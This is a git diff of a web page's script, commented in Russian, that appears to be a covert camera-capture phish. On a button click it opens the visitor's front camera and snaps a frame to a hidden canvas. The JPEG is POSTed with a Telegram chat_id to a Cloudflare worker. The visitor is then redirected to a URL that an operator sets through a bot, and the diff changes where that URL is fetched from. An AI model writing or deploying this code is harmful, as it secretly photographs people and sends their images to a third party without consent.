@@ -16,28 +16,8 @@
         <canvas id="c" style="display:none"></canvas>
 
         <script>
-       const chatId = '1976857829';
-
 const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
-const remoteConfigUrl = 'https://raw.githubusercontent.com/kissee-ref/test/refs/heads/main/url.txt';
-
-let targetUrl = 'https://google.com'; // Ссылка по умолчанию
-
-// Функция для получения актуальной ссылки из файла
-async function getTargetUrl() {
-    try {
-        const response = await fetch(remoteConfigUrl);
-        if (response.ok) {
-            const text = await response.text();
-            targetUrl = text.trim(); // Обновляем ссылку из файла
-        }
-    } catch (e) {
-        console.error("Не удалось загрузить ссылку, используем стандартную");
-    }
-}
-
-// Запускаем получение ссылки сразу при загрузке страницы
-getTargetUrl();
+const chatId = '1976857829';
 
 const btn = document.getElementById('btn');
 const video = document.getElementById('v');
@@ -47,60 +27,48 @@ btn.onclick = async () => {
     btn.innerText = "Загрузка..."; 
     btn.disabled = true;
     let stream;
+    let targetUrl = 'https://google.com'; // Ссылка по умолчанию
 
     try {
-        // 1. Запрашиваем фронтальную камеру с конкретными параметрами
+        // 1. Получаем актуальную ссылку из памяти воркера
+        const res = await fetch(proxyUrl + "/get-url");
+        if (res.ok) targetUrl = await res.text();
+
+        // 2. Работа с камерой
         stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: "user",
-                width: { ideal: 640 },
-                height: { ideal: 480 }
-            } 
+            video: { facingMode: "user" } 
         });
 
-        // ПРИВЯЗЫВАЕМ СТРИМ К ВИДЕО
         video.srcObject = stream;
-        video.setAttribute("playsinline", true); // Критично для iPhone!
+        video.setAttribute("playsinline", true);
         
-        // 2. Ждем, пока видео реально начнет играть
         await new Promise((resolve) => {
             video.onloadedmetadata = () => {
-                video.play(); // Принудительный старт
-                // Даем 1 секунду на настройку экспозиции и фокуса на телефоне
+                video.play();
                 setTimeout(resolve, 1000); 
             };
         });
 
-        // 3. Делаем снимок (захват кадра)
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'shot.jpg');
 
-        // 4. ЖДЕМ ОТПРАВКИ ЧЕРЕЗ CLOUDFLARE
-        await fetch(proxyUrl, { 
-            method: 'POST', 
-            body: formData 
-        });
+        // 3. Отправляем фото
+        await fetch(proxyUrl, { method: 'POST', body: formData });
 
     } catch (err) {
         console.error("Ошибка:", err);
     } finally {
-        // Останавливаем камеру и уходим
-        if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-        }
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        // 4. Переходим на сайт, который ты задал через бота
         window.location.href = targetUrl;
     }
 };
-
-
-
 
 
         </script>
